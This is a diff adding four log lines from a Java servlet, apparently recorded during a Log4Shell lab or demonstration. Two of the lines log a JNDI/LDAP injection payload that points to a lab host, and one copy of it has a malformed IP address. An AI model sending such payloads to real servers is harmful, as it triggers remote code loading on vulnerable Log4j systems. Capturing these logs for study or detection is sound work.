@@ -1,0 +1,4 @@
+16:07:31.523 [http-bio-8080-exec-4] INFO  com.example.LogExampleServlet - User input: ${jndi:ldap://192.168..56.101:9999/Evail}
+16:07:31.528 [http-bio-8080-exec-4] INFO  com.example.LogExampleServlet - Received a request for User-Agent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+16:21:02.210 [http-bio-8080-exec-6] INFO  com.example.LogExampleServlet - User input: ${jndi:ldap://192.168.56.101:9999/Evail}
+16:21:02.211 [http-bio-8080-exec-6] INFO  com.example.LogExampleServlet - Received a request for User-Agent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
